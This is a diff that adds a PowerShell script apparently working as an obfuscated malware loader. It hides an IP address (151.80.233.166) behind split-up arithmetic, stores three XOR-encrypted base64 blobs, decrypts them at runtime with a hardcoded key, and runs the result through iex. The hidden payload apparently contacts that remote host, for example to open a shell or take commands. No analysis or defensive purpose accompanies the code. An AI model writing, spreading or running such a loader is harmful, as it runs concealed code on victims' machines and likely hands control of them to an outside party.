@@ -1,0 +1,62 @@
+
+$enc = [System.Text.Encoding]::UTF8
+
+function xor {
+    param($string, $method)
+    $xorkey = $enc.GetBytes("-ptn@H?@U^6MWP2y")
+
+    if ($method -eq "decrypt"){
+        $string = $enc.GetString([System.Convert]::FromBase64String($string))
+    }
+
+    $byteString = $enc.GetBytes($string)
+    $xordData = $(for ($i = 0; $i -lt $byteString.length; ) {
+        for ($j = 0; $j -lt $xorkey.length; $j++) {
+            $byteString[$i] -bxor $xorkey[$j]
+            $i++
+            if ($i -ge $byteString.Length) {
+                $j = $xorkey.length
+            }
+        }
+    })
+
+    if ($method -eq "encrypt") {
+        $xordData = [System.Convert]::ToBase64String($xordData)
+    } else {
+        $xordData = $enc.GetString($xordData)
+    }
+    
+    return $xordData
+}
+
+#$output = xor "text to encrypt" "encrypt"
+# $output = xor "ciphertext" "decrypt"
+
+
+$a = 50 + 101
+$b = 79 + 1
+$c = 200 + 33
+$d = 160 + 6
+
+$add = "$a"+"."+"$b"+"."+"$c"+"."+"$d"
+
+
+
+$ARRAY1 = 'CRMYByUmS2BofngoIH19G0cVFxpgG0YzITtbYxk1Rld+HxcFJTxMbgEdZg47OVcXWVhQDyQsE3RhagJkbFoWCg1NVEojJFYlOyoYCjIkYQ1fFRUDaGEESg48TzkyC28kCRINGiU7H311bhhjYWUHShgMURVwNQQ='
+
+$ARRAY2 = 'CQMHTmB1H2IFDRZvd3sSUV0HEEduGF40PX4dbXVuElsWelAdJCoffXV2bTkyKEZXSB4XASQhUScIZAwMBBN7MAReMws0CkY0MC0eaSQjG0InVAdAFzpWNDB2Ej4zMh5JAVQHCiJmcyU7OUIlfmsWCgM2GBszIBdpbg=='
+
+$ARRAY3 = 'WhgdAiVgF2Q8fgttcyMcK0gREEZkKkY0MC0abWd8El1PCQALM2ZzJTs5QiV+eRJUQxVUXmkzNWB1fhZpMzFGGA1NVEYOLUhtGjxcKDQkElR5CQQLDilSJXUNTz4jNV9XeRUMGm4JbAMcF3MjND9WEEMXXUAHLUsTISxfIzB4FhtUBBEdbHgTYHE3H3ZdcBJZDVQHDGB1H2g8O05tczRTDUxQRlBmeR88dRFDOXoDRgtEHhNOaXM1YHV+FmkkIxJZEFBQHSJoFGB3DmVtdXAZWQUAAwppZm8hITYWZndyDFkPS35OYGgfZCY6VG1qcBoiWRUMGm4tUSM6Ol8jMA0IQ2wjNycJYREHMCp0NCM1QVEJAwdHe0IfYHV+Ej55B0AQWRVcSjMsXWxlchI+MzIcNUgeExooYQRkJnBwISIjWlEES34Te2xcLDw7WDl5E14WXhVcR3s='
+
+
+$ARRAY1 = xor $ARRAY1 "decrypt"
+
+$ARRAY2 = xor $ARRAY2 "decrypt"
+
+$ARRAY3 = xor $ARRAY3 "decrypt"
+
+
+iex($ARRAY1 + $ARRAY2 + $ARRAY3)
+
+
+
